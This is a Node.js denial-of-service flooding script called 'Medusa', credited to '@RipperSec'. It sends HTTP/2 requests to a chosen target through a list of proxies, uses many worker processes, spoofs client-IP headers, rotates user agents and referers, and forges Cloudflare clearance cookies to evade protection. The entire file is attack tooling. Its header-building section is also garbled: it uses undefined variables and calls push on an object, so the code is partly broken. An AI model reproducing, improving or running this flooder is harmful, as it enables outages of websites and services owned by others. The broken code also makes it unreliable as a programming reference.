const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 const axios = require('axios');
 const cheerio = require('cheerio'); 
 const gradient = require("gradient-string")

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

  if (process.argv.length < 7){console.log('\x1b[0m\x1b[34m' + '[' + '\x1b[1m\x1b[0m' + '!' + '\x1b[0m\x1b[34m' + ']' + '\x1b[1m\x1b[0m' + '\x1b[1m\x1b[0m' + ' node' + '\x1b[1m\x1b[33m' +' Medusa ' + '\x1b[1m\x1b[32m' + '<HOST> <TIME> <RPS> <THREADS> <PROXY>.');}
  if (process.argv.length < 7){console.log('\x1b[0m\x1b[34m' + '[' + '\x1b[1m\x1b[0m' + '!' + '\x1b[0m\x1b[34m' + ']' + '\x1b[1m\x1b[0m' + '\x1b[1m\x1b[0m' + ' Made by ' + '\x1b[1m\x1b[31m' + '@RipperSec');}
  if (process.argv.length < 7){console.log('\x1b[0m\x1b[34m' + '[' + '\x1b[1m\x1b[0m' + '!' + '\x1b[0m\x1b[34m' + ']' + '\x1b[1m\x1b[0m' + '\x1b[1m\x1b[0m' + ' Please update ur proxy with node' + '\x1b[1m\x1b[33m' +' scrape.js' + '\x1b[1m\x1b[0m');}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }
 
 const ip_spoof = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
 };
 
 const spoofed = ip_spoof();
 
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6]
 }

 const sig = [    
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
 ];
 const sigalgs1 = sig.join(':');
 const cplist = [
    "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES128-GCM-SHA256", 
    "ECDHE-ECDSA-CHACHA20-POLY1305", 
    "ECDHE-RSA-AES128-GCM-SHA256", 
    "ECDHE-RSA-CHACHA20-POLY1305", 
    "ECDHE-ECDSA-AES256-GCM-SHA384", 
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
 ];
 const accept_header = [
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
     'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
 ]; 
 const lang_header = ["en-US,en;q=0.9"];
 
 const encoding_header = ["gzip, deflate, br"];
 
 const control_header = ["no-cache", "max-age=0"];
 
 const refers = [
    'https://www.google.com',
    'https://www.facebook.com',
    'https://www.twitter.com',
    'https://www.youtube.com',
    'https://www.amazon.com',
    'https://www.netflix.com',
    'https://www.instagram.com',
    'https://www.yahoo.com',
    'https://www.stackoverflow.com',
    'https://www.github.com',
    'https://www.linkedin.com',
    'https://www.cnn.com',
    'https://www.apple.com',
    'https://www.microsoft.com',
    'https://www.wikipedia.org',
    'https://www.nytimes.com',
    'https://www.msn.com',
    'https://www.reddit.com',
    'https://www.quora.com',
    'https://www.npr.org',
    'https://www.bbc.com',
    'https://www.theguardian.com',
    'https://www.huffingtonpost.com',
    'https://www.washingtonpost.com',
    'https://www.wsj.com',
    'https://www.bloomberg.com',
    'https://www.cnbc.com',
    'https://www.merriam-webster.com',
    'https://www.dictionary.com',
    'https://www.thedailybeast.com',
    'https://www.thedailyshow.com',
    'https://www.colbertnation.com',
    'https://www.nationalgeographic.com',
    'https://www.nasa.gov',
    'https://www.nypl.org',
    'https://www.britannica.com',
    'https://www.healthline.com',
    'https://www.webmd.com',
    'https://www.mayoclinic.org',
    'https://www.cdc.gov',
    'https://www.nih.gov',
    'https://www.medlineplus.gov',
    'https://www.cancer.gov',
    'https://www.fda.gov',
    'https://www.nature.com',
    'https://www.sciencemag.org',
    'https://www.scientificamerican.com',
    'https://www.who.int',
    'https://www.un.org',
    'https://www.worldbank.org',
    'https://www.imf.org',
    'https://www.wto.org',
    'https://www.oecd.org',
    'https://www.europa.eu',
    'https://www.nato.int',
    'https://www.icrc.org',
    'https://www.amnesty.org',
    'https://www.hrw.org',
    'https://www.greenpeace.org',
    'https://www.oxfam.org',
    'https://www.doctorswithoutborders.org',
    'https://www.unicef.org',
    'https://www.savethechildren.org',
    'https://www.redcross.org',
    'https://www.wikipedia.org',
    'https://www.wikimedia.org',
    'https://www.mozilla.org',
    'https://www.apache.org',
    'https://www.mysql.com',
    'https://www.php.net',
    'https://www.python.org',
    'https://www.ruby-lang.org',
    'https://www.jquery.com',
    'https://www.reactjs.org',
    'https://www.angularjs.org',
    'https://www.vuejs.org',
    'https://www.bootstrap.com',
    'https://www.materializecss.com',
    'https://www.sass-lang.com',
    'https://www.lesscss.org',
    'https://www.d3js.org',
    'https://www.highcharts.com',
    'https://www.chartjs.org',
    'https://www.mapbox.com',
    'https://www.mapboxgl-js.com',
    'https://www.openstreetmap.org',
    'https://www.mapbox.com',
    'https://www.mapboxgl-js.com',
    'https://www.chartjs.org',
    'https://www.highcharts.com',
    'https://www.d3js.org',
    'https://www.lesscss.org',
    'https://www.sass-lang.com',
    'https://www.materializecss.com',
    'https://www.bootstrap.com',
    'https://www.vuejs.org',
    'https://www.angularjs.org',
    'https://www.reactjs.org',
    'https://www.jquery.com',
    'https://www.ruby-lang.org',
    'https://www.python.org',
    'https://www.php.net',
    'https://www.mysql.com',
    'https://www.apache.org',
    'https://www.mozilla.org',
    'https://www.wikimedia.org',
    'https://www.wikipedia.org',
    'https://www.redcross.org',
    'https://www.savethechildren.org',
    'https://www.unicef.org',
    'https://www.doctorswithoutborders.org',
    'https://www.oxfam.org',
    'https://www.greenpeace.org',
    'https://www.hrw.org',
    'https://www.amnesty.org',
    'https://www.icrc.org',
    'https://www.nato.int',
    'https://www.europa.eu',
    'https://www.oecd.org',
    'https://www.wto.org',
    'https://www.imf.org',
    'https://www.worldbank.org',
    'https://www.un.org',
    'https://www.who.int',
    'https://www.scientificamerican.com',
    'https://www.sciencemag.org',
    'https://www.nature.com',
    'https://www.fda.gov',
    'https://www.cancer.gov',
    'https://www.medlineplus.gov',
    'https://www.nih.gov',
    'https://www.cdc.gov',
    'https://www.mayoclinic.org',
    'https://www.webmd.com',
    'https://www.healthline.com',
    'https://www.britannica.com',
    'https://www.nypl.org',
    'https://www.nasa.gov',
    'https://www.nationalgeographic.com',
    'https://www.colbertnation.com',
    'https://www.thedailyshow.com',
    'https://www.thedailybeast.com',
    'https://www.dictionary.com',
    'https://www.merriam-webster.com',
    'https://www.cnbc.com',
    'https://www.bloomberg.com',
    'https://www.wsj.com',
    'https://www.washingtonpost.com',
    'https://www.huffingtonpost.com',
    'https://www.theguardian.com',
    'https://www.bbc.com',
    'https://www.npr.org',
    'https://www.quora.com',
    'https://www.reddit.com',
    'https://www.msn.com',
    'https://www.nytimes.com',
    'https://www.wikipedia.org',
    'https://www.microsoft.com',
    'https://www.apple.com',
    'https://www.cnn.com',
    'https://www.linkedin.com',
    'https://www.github.com',
    'https://www.stackoverflow.com',
    'https://www.yahoo.com',
    'https://www.instagram.com',
    'https://www.netflix.com',
    'https://www.amazon.com',
    'https://www.youtube.com',
    'https://www.twitter.com',
    'https://www.facebook.com',
    'https://www.google.com'
  ];

 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
 const ciphers1 = "GREASE:" + [
     defaultCiphers[2],
     defaultCiphers[1],
     defaultCiphers[0],
     ...defaultCiphers.slice(3)
 ].join(":");
 
 const uap = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5638.217 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5625.214 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.62",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.107",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Vivaldi/3.8.2309.45",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Brave/1.27.110",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 TorBrowser/10.5.1",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Waterfox/2021.03.1",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 PaleMeleon/77.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 K-Meleon/77.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Beamrise/1.0.2004.1",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Slimjet/20.0.2004.1",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 CentBrowser/7.3.110",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 ComodoDragon/79.0.2004.1",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 UR/7.12.2004.1",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Orbitum/4.2.1",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 CocCocBrowser/79.130.1",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 EpicPrivacyBrowser/79.0.2004.1",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 SRWareIron/79.0.2004.1",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 GhostBrowser/6.0.2004.1",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 YandexBrowser/20.0.2004.1",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Vivaldi/3.8.2309.45",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Brave/1.27.110",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Torch/20.0.2004.1",
 ];

 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
 var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
 var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
 var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);
    

const target = process.argv[2]
const time = Number(process.argv[3])
const threads = Number(process.argv[4])
const Rate = Number(process.argv[5]) | 1;

 console.log('\x1b[33m%s\x1b[0m', `Medusa Killing!`);
 console.log(`[Info] Starting ${time} seconds attack on ${target} with ${threads} threads & ${Rate} Request/s`);
 console.log('\x1b[1m\x1b[0m' + 'Tools By ' + '\x1b[1m\x1b[31m' + '@RipperSec' + '\x1b[1m\x1b[0m');

      if (cluster.isMaster) {
        for (let counter = 1; counter <= args.threads; counter++) {
          cluster.fork();
        }
      } else {
        setInterval(runFlooder);
      };
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     //connection.setTimeout(options.timeout * 600000);
     connection.setTimeout(options.timeout * 100000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }

 const Socker = new NetSocket();
 headers[":method"] = "GET";
headers[":method"] = "POST";
headers[":authority"] = parsedTarget.host;
headers["x-forwarded-proto"] = "https";
headers[":path"] = parsedTarget.path + "?" + randstr(6) + "=" + randstr(15);
headers[":scheme"] = "https";
headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
headers[":path"] = parsedTarget.path
headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
headers[":path"] = parsedTarget.path + "?" + randstr(6) + "=" + randstr(15);
headers[":authority"] = parsedTarget.host;
headers["origin"] = parsedTarget.host;
headers["Via"] = fakeIP;
headers["sss"] = fakeIP;
headers["Sec-Websocket-Key"] = fakeIP;
headers["Sec-Websocket-Version"] = 13;
headers["Upgrade"] = websocket;
headers["X-Forwarded-For"] = fakeIP;
headers["X-Forwarded-Host"] = fakeIP;
headers["Client-IP"] = fakeIP;
headers["Real-IP"] = fakeIP;
headers["Referer"] = randomReferer;
headers["User-Agent"] = randomHeaders['User-Agent'];
headers["user-agent"] = uap;
headers["User-Agent"] = uap;
headers["CF-Connecting-IP"] = fakeIP;
headers["CF-RAY"] = "randomRayValue";
headers["CF-Visitor"] = "{'scheme':'https'}";
headers["X-Forwarded-For"] = spoofed
headers["X-Forwarded-For"] = spoofed
headers["X-Forwarded-For"] = spoofed
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
headers[":scheme"] = "https";
headers["x-forwarded-proto"] = "https";
headers["cache-control"] = "no-cache";
headers["X-Forwarded-For"] = spoofed;
headers["sec-ch-ua"] = '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"';
headers["sec-ch-ua-mobile"] = "?0";
headers["sec-ch-ua-platform"] = "Windows";
headers["accept-language"] = lang;
headers["accept-encoding"] = encoding;
headers["upgrade-insecure-requests"] = "1";
headers["accept"] = accept;
headers["user-agent"] = moz + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(7);
headers["referer"] = Ref;
headers["sec-fetch-mode"] = "navigate"; 
headers["sec-fetch-dest"] = dest1;
headers["sec-fetch-user"] = "?1";
headers["TE"] = "trailers";
headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
headers["sec-fetch-site"] = site1;
headers["x-requested-with"] = "XMLHttpRequest";
headers.GET = ' / HTTP/2';
headers[':path'] = parsedTarget.path;
headers[':scheme'] = 'https';
headers.Referer = 'https://google.com';
headers.accept_header = xn;
headers['accept-language'] = badag;
headers['accept-encoding'] = enc; 
headers.Connection = 'keep-alive';
headers['upgrade-insecure-requests'] = '1';
headers.TE = 'trailers';
headers['x-requested-with'] = 'XMLHttpRequest';
headers['Max-Forwards'] = '10';
headers.pragma = 'no-cache';
headers.Cookie = 'cf_clearance=mOvsqA7JGiSddvLfrKvg0VQ4ARYRoOK9qmQZ7xTjC9g-1698947194-0-1-67ed94c7.1e69758c.36e830ad-250.2.1698947194'; 
headers["Real-IP"] = spoofed;
headers["referer"] = Ref;
headers[":authority"] = parsedTarget.host + ":80"; // Include port 80 in :authority header
headers["origin"] = "https://" + parsedTarget.host + ":80"; // Include port 80 in origin header
headers["Via"] = "1.1 " + parsedTarget.host + ":80"; // Include port 80 in Via header
headers[":authority"] = parsedTarget.host + ":443"; // Include port 80 in :authority header
headers["origin"] = "https://" + parsedTarget.host + ":443"; // Include port 80 in origin header
headers["Via"] = "1.1 " + parsedTarget.host + ":443"; // Include port 80 in Via header
headers.push({ "Alt-Svc": "http/1.1=" + parsedTarget.host + "; ma=7200" }); // Add the http/1.1 header
headers.push({ "Alt-Svc": "http/1.2=" + parsedTarget.host + "; ma=7200" }); // Add the http/1.2 header
headers.push({ "Alt-Svc": "http/2=" + parsedTarget.host + "; ma=7200" });   // Add the http/2 header 
headers.push({ "Alt-Svc": "http/1.1=http2." + parsedTarget.host + ":80; ma=7200" }); // Add the http/1.1 header with port 80
headers.push({ "Alt-Svc": "http/1.2=http2." + parsedTarget.host + ":80; ma=7200" }); // Add the http/1.2 header with port 80
headers.push({ "Alt-Svc": "http/2=http2." + parsedTarget.host + ":80; ma=7200" });   // Add the http/2 header with port 80
headers.push({ "Alt-Svc": "http/1.1=" + parsedTarget.host + ":443; ma=7200" });      // Add the http/1.1 header with port 443
headers.push({ "Alt-Svc": "http/1.2=" + parsedTarget.host + ":443; ma=7200" });      // Add the http/1.2 header with port 443
headers.push({ "Alt-Svc": "http/2=" + parsedTarget.host + ":443; ma=7200" });        // Add the http/2 header with port 443  
headers["cf-cache-status"] = "BYPASS";
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":"); 
	 //headers[":authority"] = parsedTarget.host;
         headers["referer"] = "https://" + parsedTarget.host + "/?" + randstr(15);
         headers["origin"] = "https://" + parsedTarget.host;

     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100,
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 600000);

         const tlsOptions = {
            host: parsedTarget.host,
            port: 443,
            secure: true,
            ALPNProtocols: ['h2'],
            sigals: siga,
            socket: connection,
            ciphers: tls.getCiphers().join(":") + cipper,
            ecdhCurve: "prime256v1:X25519",
            host: parsedTarget.host,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60000);

         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 2000,
            initialWindowSize: 65535,
            maxHeaderListSize: 65536,
            enablePush: false
          },
             maxSessionMemory: 64000,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 2000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    //headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
                    const request = client.request(headers)
                    
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
     }),function (error, response, body) {
		};
 }
 
 const KillScript = () => process.exit(1);
 setTimeout(KillScript, args.time * 1000);
